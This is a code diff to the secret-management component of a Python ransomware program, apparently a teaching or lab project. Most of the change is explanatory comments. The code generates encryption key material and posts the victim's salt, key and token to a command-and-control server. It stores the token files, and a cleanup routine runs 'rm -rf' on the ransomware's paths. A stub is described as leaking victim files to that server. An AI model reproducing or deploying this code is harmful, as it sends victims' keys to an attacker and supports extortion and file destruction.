@@ -20,68 +20,92 @@ class SecretManager:
     KEY_LENGTH = 16
 
     def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
+        # member variable storing the ip address and port of the cnc
         self._remote_host_port = remote_host_port
+        # member variable storing a path
         self._path = path
+        # member variables storing cryptigraphic data
         self._key = b''
         self._salt = b''
         self._token = b''
+        
         self._log = logging.getLogger(self.__class__.__name__)
         
 
     def do_derivation(self, salt: bytes, key: bytes) -> bytes:
+        # definition of the kdf used to derive salt and key into a token
         KDF = PBKDF2HMAC(algorithm = hashes.SHA256(),
                          length = SecretManager.KEY_LENGTH,
                          salt = salt,
                          iterations = SecretManager.KDF_ITERATION_NUMBER)
-        return KDF.derive(key)
+        token = KDF.derive(key)
+        return token
    
     def create(self) -> Tuple[bytes, bytes, bytes]:
+        # creation of two cryptographic values saved as salt and key, of length 16B with an cryptographically strong random number generator (not TRNG, though)
         salt = urandom(SecretManager.SALT_LENGTH)
         key = urandom(SecretManager.KEY_LENGTH)
+        # derivation of salt and key into a unique token
         token = self.do_derivation(salt, key)
+        # debug messages
         self._log.debug('cryptographic data generated:')
         self._log.debug((token, key, salt))
+
         return (salt, key, token)
 
     def bin_to_b64(self, data: bytes) -> str:
+        # simple b64 encoding of any binary data passed as bytes
         tmp = base64.b64encode(data)
         return str(tmp, "utf8")
 
     def post_new(self, salt: bytes, key: bytes, token: bytes) -> int:
         # register the victim to the CNC
+
+        # creation of a JSON holding the cryptographic data of the victim
         secrets_json = {
         "salt": self.bin_to_b64(salt),
                 "key": self.bin_to_b64(key),
                 "token": self.bin_to_b64(token),
                 }
+
+        # header to help post JSON
         header = {"Content-Type":"application/json"}
         self._log.debug(secrets_json)
         
+        # generation of a directory label for the CNC based on the token
+        # If the victim were to send an email to our address with the token hash as an object, we could match the corresponding key to the token hash inside of our CNC filesystem
         dir_label = self.get_hex_token()
-    
+        
+        # URL to send POST request to; the parameter is the token hash
         url = f"http://{self._remote_host_port}/new?label={dir_label}"
         
+        # post request at said URL with the content of secrets_json
         post_request = requests.post(url, json = secrets_json, headers=header)
         return post_request.status_code
 
     def setup(self) -> None:
         # main function to create crypto data and register malware to cnc
-        self._salt, self._key, self._token = self.create()
 
+        # creation of crypto data and assignment to member variables
+        self._salt, self._key, self._token = self.create()
+        
+        # post request of said data
         post_status_code = self.post_new(self._salt, self._key, self._token)
 
+        # we can display the returned status_code to check that everything worked
         self._log.debug("post_new request returned with code " + str(post_status_code))
-
-        if not Path(self._path).exists():  
-            Path(self._path).mkdir(parents=True, exist_ok=True)
-        if Path(self._path + '/token.bin').exists():
+        
+        token_path = f"{self._path}/token"
+        if not Path(token_path).exists():  
+            Path(token_path).mkdir(parents=True, exist_ok=False)
+        if Path(f"{token_path}/token.bin").exists():
             raise FileExistsError
         
         # open taking parameter 'wb' allows the program to write into a binary file
         
-        with open(self._path + '/token.bin', 'wb') as token_binary_file:
+        with open(f"{token_path}/token.bin", 'wb') as token_binary_file:
             token_binary_file.write(self._token)
-        with open(self._path + '/salt.bin', 'wb') as salt_binary_file:
+        with open(f"{token_path}/salt.bin", 'wb') as salt_binary_file:
             salt_binary_file.write(self._salt)
 
         return None
@@ -102,10 +126,11 @@ class SecretManager:
     
     def load(self) -> None:
         # function to load crypto data
-        with open(self._path + "/token.bin", 'rb') as token_file:
+        token_path = f"{self._path}/token"
+        with open(f"{token_path}/token.bin", 'rb') as token_file:
             self._token = token_file.read()
             self._log.debug(self._token)
-        with open(self._path + "/salt.bin", 'rb') as salt_file:
+        with open(f"{token_path}/salt.bin", 'rb') as salt_file:
             self._salt = salt_file.read()
             self._log.debug(self._salt)
 
@@ -130,12 +155,12 @@ class SecretManager:
     
 
     def clean(self, install_path) -> None:
-        # remove crypto data from the target
+        # remove ransomware and crypto data from the target
         system(f"rm -rf {self._path}")
         system(f"rm -rf {install_path}")
     
         return None
 
     def leak_files(self, files: List[str]) -> None:
-        # send file, geniune path and token to the CNC
+        # send file, genuine path and token to the CNC
         raise NotImplemented()
